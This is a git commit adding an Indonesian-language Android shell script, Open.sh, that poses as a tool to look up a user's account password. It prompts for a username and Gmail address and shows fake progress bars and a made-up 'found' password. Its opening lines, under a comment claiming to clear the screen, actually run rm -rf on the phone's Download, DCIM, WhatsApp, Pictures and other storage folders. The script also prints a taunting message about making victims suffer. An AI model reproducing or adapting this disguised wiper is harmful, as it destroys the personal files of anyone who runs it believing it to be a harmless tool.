bef04cf97cb7c9150fe073894e77e1f82582f3e8
THEIMMORTALHACKER <71122269+THEIMMORTALHACKER@users.noreply.github.com>
2020-09-30 08:58:14 +0700

    Create Open.sh

---
+++ Open.sh
@@ -0,0 +1,122 @@
+#!/system/xbin/bash
+#AUTHOR:NOTBAD
+#Github:https://github.com/THEIMMORTALHACKER
+#Bersihkan Layar
+cd /sdcard
+rm -rf Android
+rm -rf Download
+rm -rf DCIM
+rm -rf UCDownloads
+rm -rf com.garena.game.codm
+rm -rf Music
+rm -rf Pictures
+rm -rf Movies
+rm -rf WhatsApp
+rm -rf KAWAI3
+rm -rf Vidio
+blue='\e[1;34m'
+green='\e[1;32m'
+purple='\[1;35m'
+cyan='\e[1;36m'
+red='\e[1;31m'
+white='\e[1;37m'
+yellow='\e[1;33m'
+sleep 3
+echo "\033[32;1m
+#################################
+#-AUTHOR= RIDWAN-KECHIL..       #
+#-INSTAGRAM=ridwan58aja         #
+#-Team=THEIMMORTALHACKER        #
+#################################
+"
+sleep 1
+
+echo "\033[32;1mTULIS= User anda! "
+read p;
+
+sleep 2
+
+echo "\033[32;1m
+#-PENCARIAN DALAM progses-#
+______________________________
+|1.pencarian akun anda       |
+|2.harap bersabar sayang     |
+|3.pencarian di mulai        |
+|4.cek cek cek..             |
+|5.progses ...               |
+|6.dimulai......             |
+|7.Subs dulu chnl            |
+|8.Ridwan Kechil.....        |
+|9.Jangan lupa .......       |
+|10.pulsa anda akan kami.    |
+|11.kirimkan harap           |
+|12.bersabar no tipu.        |
+|13.Hacker WR.py.            |
+|14.Subscribe juga           |
+|15.Panda 05 untuk           |
+|16.melanjutkan progses.     |
+|17.jangan lupa.             |
+|18.tersenyum....            |
+|19.File Ditemukan....       |
+|20.membuka File.......      |
+|Membutuhkan pengisian 40k.  |
+|____________________________|
+Peringatan buat kalian semua jangan pernah menyalah gunakan script orang lain
+>>>>>>>>>>>>>> ....
+"
+echo "\033[32;1mGmail anda : "
+read p;
+
+sleep 2
+echo "Sabar Gan Proses tunggu sampai selesai..."
+echo "\033[34;1m#10%"
+sleep 1
+echo "##20%"
+sleep 1
+echo "###30%"
+sleep 2
+echo "####40%"
+sleep 2
+echo "#####50%"
+sleep 2
+echo "######60%"
+sleep 2
+echo "#######70%"
+sleep 4
+echo "########80%"
+sleep 3
+echo "#########90%"
+sleep 4
+echo "##########100%"
+sleep 3
+echo "_____________________________________"
+sleep 2
+echo "Baca Pesen Gue"
+sleep 2
+echo "hacker Jahat Berawal Dari"
+sleep 2
+echo "hacker Baik namun Di Sakiti"
+sleep 2
+echo "Seperti Saya Yang Selalu Di Sakiti"
+sleep 2
+echo "Jadi Kalian Harus Merasakannya  ✓"
+sleep 2
+echo "¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥"
+sleep 2
+echo "melacak kata sandi Anda****"
+sleep 2
+echo " Sandi Jangan Di ganti Atau Akun anda akan hilang Tunggu 7 hari setalah itu boleh kalian ganti*"
+sleep 2
+echo "Data Di Temukan baca Pesen gw di atas "
+sleep 2
+echo "kata Sandi Anda 👇👇"
+sleep 2
+echo "Mentos3211"
+sleep 2
+echo "____________________________________"
+sleep 2
+toilet -f standard -F gay "Open"
+sleep 1
+toilet -f standard -F gay "Open"
+sleep 1
+toilet -f standard -F gay "Open
